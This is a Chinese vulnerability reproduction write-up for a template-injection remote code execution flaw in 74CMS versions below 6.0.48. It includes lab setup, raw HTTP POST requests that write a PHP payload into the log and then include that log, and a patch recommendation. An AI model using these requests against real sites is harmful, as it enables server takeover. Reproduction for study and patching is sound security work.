一、骑士CMS简介
=========

骑士人才系统,是一项基于 PHP+MYSQL 为核心开发的一套 免费+开源 专业人才招聘系统，使用了ThinkPHP框架（3.2.3）；由太原迅易科技有限公司于2009年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业HR青睐的求职招聘平台。经过7年的发展，骑士人才系统已成国内人才系统行业的排头兵。系统应用涉及政府、企业、科研教育和媒体等行业领域，用户已覆盖国内所有省份和地区。2016年全新推出骑士人才系统基础版，全新的“平台+插件”体系，打造用户“DIY”个性化功能定制，为众多地方门户、行业人才提供一个专业、稳定、方便的网络招聘管理平台，致力发展成为引领市场风向的优质高效的招聘软件

二、环境搭建
======

此次采用 windows10+Nginx+MySQL+PHP，使用phpstudy进行的环境配置，注意PHP版本最好使用 PHP 5.5及以上，MySQL版本 5.7.6及以上，我这里使用PHP版本5.4.45

然后这里放一下骑士cms的下载链接:<https://pan.hallolck.com/s/y06I6>

三、安装过程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png)

四、漏洞概述
======

官方公告地址

```php
http://www.74cms.com/news/show-2497.html
```

/Application/Common/Controller/BaseController.class.php文件的assign\_resume\_tpl函数因为过滤不严格，导致了模板注入，可以进行远程命令执行

**影响版本:骑士CMS &lt; 6.0.48&gt;**

五、漏洞复现
======

### 写入日志

POST参数：

```php
http://your-ip/index.php?m=home&amp;a=assign_resume_tpl
POST:
variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

我们来POST一下看看

```php
POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1
Host: 192.168.1.6
Content-Length: 98
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl
DNT: 1
Connection: close
Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show h="info" id="$_GET['id']"/>
```

可以看到返回了错误，日志已经记录了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png)  
我们来翻一下日志

```php
日志路径: \upload\data\Runtime\Logs\Home
```

成功写入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png)

接下来我们尝试包含日志，日志名称就是测试当天的年月日

### 包含日志

POST参数：

```php
http://your-ip/index.php?m=home&amp;a=assign_resume_tpl 
POST: 
variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_22.log
```

我们来POST一下看看

```php
POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1
Host: 192.168.1.6
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl
DNT: 1
Connection: close
Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

variable=1&amp;tpl=./data/Runtime/Logs/Home/21_07_01.log
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png)

六、修复建议
======

下载官方最新补丁包

```php
http://www.74cms.com/download/index.html
```